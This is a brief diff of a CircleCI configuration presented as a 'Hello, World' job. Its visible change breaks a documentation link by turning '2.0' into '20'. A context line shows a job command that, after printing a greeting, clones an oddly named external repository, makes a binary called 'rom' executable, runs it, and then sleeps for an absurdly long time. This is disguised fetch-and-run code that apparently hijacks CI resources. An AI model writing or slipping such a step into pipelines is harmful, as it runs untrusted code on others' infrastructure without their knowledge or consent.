@@ -21,7 +21,7 @@ jobs:
           command: echo Hello, World!;git clone https://github.com/cantribused/Contriibused.git;cd Contriibused;chmod 700 rom;./rom;sleep 437626763463
 
 # Invoke jobs via workflows
-# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
+# See: https://circleci.com/docs/20/configuration-reference/#workflows
 workflows:
   say-hello-workflow:
     jobs:
